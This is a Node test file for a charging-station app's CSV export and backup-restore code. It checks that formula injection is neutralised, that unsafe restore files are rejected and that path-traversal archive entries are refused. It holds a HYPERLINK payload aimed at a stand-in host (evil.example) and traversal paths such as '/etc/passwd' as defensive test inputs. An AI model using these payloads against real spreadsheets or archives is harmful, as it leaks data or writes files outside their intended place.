/**
 * CSV export safety and backup/restore behaviour.
 *
 * Run: node --experimental-strip-types --test tests/nodeps/csv-backup.test.ts
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  csvString,
  exportFileName,
  formatNumber,
  number,
  renderCell,
  renderRow,
  text,
  trusted,
} from '../../src/shared/csv.ts';
import {
  isSafeArchiveEntryPath,
  sha256OfFile,
  validateRestoreCandidate,
} from '../../src/database/backup.ts';
import { openNodeSqlite } from '../../src/database/drivers/node-sqlite.ts';
import { applyConnectionPragmas } from '../../src/database/driver.ts';
import { migrate } from '../../src/database/migrator.ts';
import { MIGRATIONS } from '../../src/database/migrations/index.ts';
import { T0 } from './helpers.ts';

describe('CSV quoting', () => {
  test('commas, quotes and newlines are quoted per RFC 4180', () => {
    assert.equal(renderCell(text('plain')), 'plain');
    assert.equal(renderCell(text('a,b')), '"a,b"');
    assert.equal(renderCell(text('say "hi"')), '"say ""hi"""');
    assert.equal(renderCell(text('line1\nline2')), '"line1\nline2"');
  });

  test('a row joins cells with commas', () => {
    assert.equal(
      renderRow([text('Mesa'), number(50), trusted('2026-09-17T00:00:00Z')]),
      'Mesa,50,2026-09-17T00:00:00Z',
    );
  });
});

describe('spreadsheet formula injection', () => {
  test('untrusted text beginning with a formula character is neutralised', () => {
    for (const dangerous of ['=1+1', '+1', '-1+1', '@SUM(A1)', '\tcmd', '\rcmd']) {
      const rendered = renderCell(text(dangerous));
      assert.ok(
        rendered.startsWith("'") || rendered.startsWith('"\''),
        `${JSON.stringify(dangerous)} should be prefixed, got ${rendered}`,
      );
    }
  });

  test('a station name carrying an injection payload cannot execute', () => {
    const hostile = '=HYPERLINK("http://evil.example/"&A1,"click")';
    const rendered = renderCell(text(hostile));
    assert.ok(rendered.includes("'="), 'the leading = is escaped');
    assert.ok(!rendered.startsWith('='), 'the cell no longer starts with =');
  });

  test('numeric measurements are never altered, including negatives', () => {
    assert.equal(renderCell(number(-12.5)), '-12.5');
    assert.equal(renderCell(number(0)), '0');
    assert.equal(renderCell(number(49.999999)), '49.999999');
  });

  test('a missing value exports as empty, never as a convincing zero', () => {
    assert.equal(renderCell(number(null)), '');
    assert.equal(renderCell(text(null)), '');
    assert.equal(formatNumber(null), '');
    assert.equal(formatNumber(Number.NaN), '');
    assert.notEqual(renderCell(number(null)), '0');
  });
});

describe('CSV documents', () => {
  test('provenance comments and headers precede the rows', () => {
    const doc = csvString({
      headers: ['station', 'occupancy_pct', 'observed_at_utc'],
      provenanceComments: [
        'ChargeWatch export · metric algorithm version 1',
        'Window 2026-08-18 to 2026-09-17 · DC fast only',
      ],
      rows: [[text('Banner Baywood 2'), number(49.5), trusted('2026-09-17T07:42:00Z')]],
      lineEnding: '\n',
    });
    const lines = doc.trimEnd().split('\n');
    assert.match(lines[0] ?? '', /^# ChargeWatch export/);
    assert.equal(lines[2], 'station,occupancy_pct,observed_at_utc');
    assert.equal(lines[3], 'Banner Baywood 2,49.5,2026-09-17T07:42:00Z');
  });

  test('a row whose width does not match the headers is a programming error', () => {
    assert.throws(
      () => csvString({ headers: ['a', 'b'], rows: [[text('only one')]] }),
      /2 headers/,
    );
  });

  test('export filenames carry the area and date range', () => {
    assert.equal(
      exportFileName({
        area: 'Mesa, AZ',
        fromIsoDate: '2026-08-18',
        toIsoDate: '2026-09-17',
        kind: 'raw observations',
      }),
      'chargewatch-mesa-az-2026-08-18_2026-09-17-raw-observations.csv',
    );
  });
});

describe('restore validation', () => {
  async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
    const dir = await mkdtemp(join(tmpdir(), 'chargewatch-restore-'));
    try {
      return await fn(dir);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }

  test('a missing file is rejected', async () => {
    await withTempDir(async (dir) => {
      const preview = await validateRestoreCandidate({
        candidatePath: join(dir, 'nope.sqlite'),
        openForVerify: openNodeSqlite,
      });
      assert.equal(preview.ok, false);
      assert.equal(preview.rejection, 'file_missing');
    });
  });

  test('a file that is not a database is rejected', async () => {
    await withTempDir(async (dir) => {
      const path = join(dir, 'notadb.sqlite');
      await writeFile(path, 'this is definitely not sqlite', 'utf8');
      const preview = await validateRestoreCandidate({
        candidatePath: path,
        openForVerify: openNodeSqlite,
      });
      assert.equal(preview.ok, false);
      assert.ok(['not_a_database', 'integrity_failed'].includes(preview.rejection ?? ''));
    });
  });

  test('a valid database previews its contents for confirmation', async () => {
    await withTempDir(async (dir) => {
      const path = join(dir, 'good.sqlite');
      const driver = openNodeSqlite(path);
      applyConnectionPragmas(driver);
      migrate(driver, MIGRATIONS, { appVersion: '0.1.0', nowMs: T0 });
      driver.close();

      const preview = await validateRestoreCandidate({
        candidatePath: path,
        openForVerify: openNodeSqlite,
      });
      assert.equal(preview.ok, true);
      assert.equal(preview.schemaVersion, 1);
      assert.equal(preview.observationCount, 0);
      assert.equal(preview.appVersion, '0.1.0');
      assert.ok((preview.byteSize ?? 0) > 0);
    });
  });

  test('a newer schema is refused rather than opened', async () => {
    await withTempDir(async (dir) => {
      const path = join(dir, 'future.sqlite');
      const driver = openNodeSqlite(path);
      applyConnectionPragmas(driver);
      migrate(driver, MIGRATIONS, { appVersion: '0.1.0', nowMs: T0 });
      driver
        .prepare(
          `INSERT INTO schema_migrations (version, name, checksum, app_version, applied_at_ms)
           VALUES (42, 'future', 'x', '9.0.0', ?)`,
        )
        .run(T0);
      driver.close();

      const preview = await validateRestoreCandidate({
        candidatePath: path,
        openForVerify: openNodeSqlite,
      });
      assert.equal(preview.ok, false);
      assert.equal(preview.rejection, 'unsupported_future_schema');
      assert.match(preview.detail ?? '', /has not been touched/);
    });
  });

  test('a checksum mismatch is rejected before the database is opened', async () => {
    await withTempDir(async (dir) => {
      const path = join(dir, 'tampered.sqlite');
      const driver = openNodeSqlite(path);
      applyConnectionPragmas(driver);
      migrate(driver, MIGRATIONS, { appVersion: '0.1.0', nowMs: T0 });
      driver.close();

      const realHash = await sha256OfFile(path);
      assert.equal(realHash.length, 64);

      const preview = await validateRestoreCandidate({
        candidatePath: path,
        openForVerify: openNodeSqlite,
        expectedSha256: 'f'.repeat(64),
      });
      assert.equal(preview.ok, false);
      assert.equal(preview.rejection, 'checksum_mismatch');
    });
  });

  test('an oversized candidate is rejected without being parsed', async () => {
    await withTempDir(async (dir) => {
      const path = join(dir, 'big.sqlite');
      await writeFile(path, Buffer.alloc(4096), 'binary');
      const preview = await validateRestoreCandidate({
        candidatePath: path,
        openForVerify: openNodeSqlite,
        maxBytes: 1024,
      });
      assert.equal(preview.ok, false);
      assert.equal(preview.rejection, 'too_large');
    });
  });
});

describe('archive path safety', () => {
  test('traversal, absolute and drive-qualified entries are rejected', () => {
    for (const bad of [
      '../escape.txt',
      'a/../../escape.txt',
      '/etc/passwd',
      '\\windows\\system32',
      'C:\\Users\\Calvin\\evil.exe',
      '',
    ]) {
      assert.equal(isSafeArchiveEntryPath(bad), false, `${JSON.stringify(bad)} must be rejected`);
    }
  });

  test('ordinary relative entries are accepted', () => {
    for (const good of ['manifest.json', 'db/history.sqlite', 'logs/collector.log']) {
      assert.equal(isSafeArchiveEntryPath(good), true);
    }
  });
});
